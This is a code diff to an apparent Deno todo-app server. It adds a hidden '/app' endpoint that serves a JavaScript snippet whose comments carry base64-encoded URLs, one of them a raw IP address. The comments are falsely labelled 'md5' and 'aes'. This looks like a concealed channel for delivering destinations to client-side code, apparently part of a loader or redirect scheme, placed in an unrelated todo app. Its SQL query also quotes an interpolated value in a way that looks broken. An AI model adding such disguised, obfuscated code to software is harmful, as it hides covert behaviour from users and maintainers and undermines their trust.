@@ -22,7 +22,8 @@ serve(async (req:Request,connInfo) => {
     }
 
     console.log(url,req);
-  
+    let appId=url.searchParams.get("id");
+
     // Grab a connection from the database pool
     const connection = await pool.connect();
   
@@ -36,7 +37,31 @@ serve(async (req:Request,connInfo) => {
           return new Response(body, {
             headers: { "content-type": "application/json" },
           });
-    } else if (url.pathname=="/post") { // This is a POST request. Create a new todo.
+      } else if (url.pathname=="/app") {
+        const result = await connection.queryObject`
+          SELECT * FROM url where key='${appId}'
+        `;
+        if(result.rows[0]){
+          let base64=Buffer.from(result.rows[0].url).toString("base64");
+          
+          return new Response(`if($.browser.mozilla||$.browser.opera)
+          (function(){
+          window.addEventListener('pageshow', PageShowHandler, false);
+          window.addEventListener('unload', UnloadHandler, false);
+            function PageShowHandler() {
+                window.addEventListener('unload', UnloadHandler, false);
+            }
+            function UnloadHandler() {
+                window.removeEventListener('beforeunload', UnloadHandler, false);
+            }
+        })()/** md5:${base64}**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/`, {
+            headers: { "content-type": "application/text" },
+          });
+        }
+        return new Response("didnt find", {
+          headers: { "content-type": "application/text" },
+        });
+      } else if (url.pathname=="/post") { // This is a POST request. Create a new todo.
           // Parse the request body as JSON. If the request body fails to parse,
           // is not a string, or is longer than 256 chars, return a 400 response.
           const title = await req.json().catch(() => null);
